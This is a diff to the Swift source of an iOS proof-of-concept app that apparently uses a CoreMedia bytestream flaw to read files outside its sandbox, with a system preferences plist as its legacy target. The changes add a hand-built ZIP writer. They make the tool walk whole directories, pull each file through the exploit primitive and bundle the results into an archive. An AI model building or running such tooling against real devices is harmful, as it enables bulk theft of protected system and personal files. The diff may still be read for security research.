@@ -2,7 +2,7 @@
 //  ContentView.swift
 //  MConfPoC
 //
-//  CoreMedia bytestream PoC with Directory Traversal & Consolidation.
+//  CoreMedia bytestream PoC with Resilient Directory Traversal & ZIP Export.
 //  Runs only on explicit Run-button press. The target path is supplied in the UI.
 //  Results and short execution messages are saved inside Documents/.
 //
@@ -40,6 +40,106 @@ private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
     Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
 }
 
+// MARK: - Simple In-Memory ZIP Creator (Store Method)
+
+private struct ZipWriter {
+    private var data = Data()
+    private var directoryRecords = Data()
+    private var fileCount: UInt16 = 0
+
+    mutating func addFile(relativePath: String, fileData: Data) {
+        let pathBytes = Array(relativePath.utf8)
+        let pathLength = UInt16(pathBytes.count)
+        let fileOffset = UInt32(data.count)
+        let crc = crc32(fileData)
+        let fileSize = UInt32(fileData.count)
+
+        // Local File Header
+        var header = Data()
+        header.append(contentsOf: [0x50, 0x4b, 0x03, 0x04]) // Signature
+        header.append(contentsOf: [0x14, 0x00])             // Version needed (2.0)
+        header.append(contentsOf: [0x00, 0x00])             // General flag
+        header.append(contentsOf: [0x00, 0x00])             // Compression: 0 (Store)
+        header.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // Mod time/date
+        header.append(withUnsafeBytes(of: crc) { Data($0) })
+        header.append(withUnsafeBytes(of: fileSize) { Data($0) })
+        header.append(withUnsafeBytes(of: fileSize) { Data($0) })
+        header.append(withUnsafeBytes(of: pathLength) { Data($0) })
+        header.append(contentsOf: [0x00, 0x00])             // Extra field length
+        header.append(contentsOf: pathBytes)
+
+        data.append(header)
+        data.append(fileData)
+
+        // Central Directory Structure
+        var cdRecord = Data()
+        cdRecord.append(contentsOf: [0x50, 0x4b, 0x01, 0x02]) // Signature
+        cdRecord.append(contentsOf: [0x14, 0x00])             // Version made by
+        cdRecord.append(contentsOf: [0x14, 0x00])             // Version needed
+        cdRecord.append(contentsOf: [0x00, 0x00])             // General flag
+        cdRecord.append(contentsOf: [0x00, 0x00])             // Compression: 0
+        cdRecord.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // Mod time/date
+        cdRecord.append(withUnsafeBytes(of: crc) { Data($0) })
+        cdRecord.append(withUnsafeBytes(of: fileSize) { Data($0) })
+        cdRecord.append(withUnsafeBytes(of: fileSize) { Data($0) })
+        cdRecord.append(withUnsafeBytes(of: pathLength) { Data($0) })
+        cdRecord.append(contentsOf: [0x00, 0x00])             // Extra field length
+        cdRecord.append(contentsOf: [0x00, 0x00])             // Comment length
+        cdRecord.append(contentsOf: [0x00, 0x00])             // Disk number start
+        cdRecord.append(contentsOf: [0x00, 0x00])             // Internal file attributes
+        cdRecord.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // External file attributes
+        cdRecord.append(withUnsafeBytes(of: fileOffset) { Data($0) })
+        cdRecord.append(contentsOf: pathBytes)
+
+        directoryRecords.append(cdRecord)
+        fileCount += 1
+    }
+
+    mutating func finalize() -> Data {
+        let cdOffset = UInt32(data.count)
+        let cdSize = UInt32(directoryRecords.count)
+
+        data.append(directoryRecords)
+
+        // End of Central Directory Record (EOCD)
+        var eocd = Data()
+        eocd.append(contentsOf: [0x50, 0x4b, 0x05, 0x06])     // Signature
+        eocd.append(contentsOf: [0x00, 0x00])                 // Disk number
+        eocd.append(contentsOf: [0x00, 0x00])                 // Disk with CD
+        eocd.append(withUnsafeBytes(of: fileCount) { Data($0) }) // CD entries on disk
+        eocd.append(withUnsafeBytes(of: fileCount) { Data($0) }) // Total CD entries
+        eocd.append(withUnsafeBytes(of: cdSize) { Data($0) })
+        eocd.append(withUnsafeBytes(of: cdOffset) { Data($0) })
+        eocd.append(contentsOf: [0x00, 0x00])                 // Comment length
+
+        data.append(eocd)
+        return data
+    }
+
+    private func crc32(_ data: Data) -> UInt32 {
+        var crc: UInt32 = 0xffffffff
+        for byte in data {
+            let index = Int((crc ^ UInt32(byte)) & 0xff)
+            crc = (crc >> 8) ^ ZipWriter.crc32Table[index]
+        }
+        return crc ^ 0xffffffff
+    }
+
+    private static let crc32Table: [UInt32] = {
+        (0...255).map { i -> UInt32 in
+            var c = UInt32(i)
+            for _ in 0..<8 {
+                if (c & 1) != 0 {
+                    c = 0xedb88320 ^ (c >> 1)
+                } else {
+                    c = c >> 1
+                }
+            }
+            return c
+        }
+    }()
+}
+
 // MARK: - Helper Types & Utilities
 
 private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
@@ -48,13 +148,6 @@ private func outputFilename(for targetPath: String) -> String {
     let name = URL(fileURLWithPath: targetPath).lastPathComponent
     let safeName = name.isEmpty || name == "/" ? "target.bin" : name
     return "Recovered-" + safeName
-}
-
-private func recoveredFileURL(for targetPath: String) -> URL {
-    let filename = targetPath == legacyTargetPath
-        ? "GlobalPreferences.plist"
-        : outputFilename(for: targetPath)
-    return docs.appendingPathComponent(filename)
 }
 
 private struct ActivityView: UIViewControllerRepresentable {
@@ -408,7 +501,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         }
     }
 
-    // Helper: Opens a path via CoreMedia stream and extracts raw Data
+    // Safely attempts to fetch raw file data via CoreMedia. Non-throwing, returns nil on failure.
     func fetchFileData(at path: String) -> Data? {
         let cfURL = URL(fileURLWithPath: path) as CFURL
         var msg: UnsafeMutableRawPointer? = nil
@@ -466,8 +559,9 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
                 let subpaths = try fm.subpathsOfDirectory(atPath: targetPath)
                 logLine("Found \(subpaths.count) items in directory")
                 
-                var combinedData = Data()
-                var readCount = 0
+                var zip = ZipWriter()
+                var readSuccessCount = 0
+                var readErrorCount = 0
                 
                 for relPath in subpaths {
                     let fullPath = (targetPath as NSString).appendingPathComponent(relPath)
@@ -476,25 +570,22 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
                     if fm.fileExists(atPath: fullPath, isDirectory: &subIsDir), !subIsDir.boolValue {
                         logLine("Reading: \(relPath)")
                         if let fileData = fetchFileData(at: fullPath) {
-                            // Header format for consolidated container:
-                            // FILE:<relative_path>\nSIZE:<byte_size>\n<raw_bytes>\n\n
-                            let header = "FILE:\(relPath)\nSIZE:\(fileData.count)\n"
-                            if let headerData = header.data(using: .utf8) {
-                                combinedData.append(headerData)
-                                combinedData.append(fileData)
-                                combinedData.append("\n\n".data(using: .utf8)!)
-                                readCount += 1
-                            }
+                            zip.addFile(relativePath: relPath, fileData: fileData)
+                            readSuccessCount += 1
                         } else {
-                            logLine("Failed to read: \(relPath)")
+                            logLine("Skipped (read failed): \(relPath)")
+                            readErrorCount += 1
                         }
                     }
                 }
                 
-                let archiveName = "RecoveredFolder-\(URL(fileURLWithPath: targetPath).lastPathComponent).bin"
+                let zipData = zip.finalize()
+                let targetName = URL(fileURLWithPath: targetPath).lastPathComponent
+                let archiveName = "RecoveredFolder-\(targetName.isEmpty ? "Directory" : targetName).zip"
                 let outputURL = docs.appendingPathComponent(archiveName)
-                try combinedData.write(to: outputURL, options: .atomic)
-                logLine("Saved consolidated directory (\(readCount) files, \(combinedData.count) bytes): \(archiveName)", resultURL: outputURL)
+                
+                try zipData.write(to: outputURL, options: .atomic)
+                logLine("Saved ZIP archive (\(readSuccessCount) files read, \(readErrorCount) skipped, \(zipData.count) bytes): \(archiveName)", resultURL: outputURL)
                 
             } catch {
                 logLine("Directory enumeration failed: \(error.localizedDescription)")
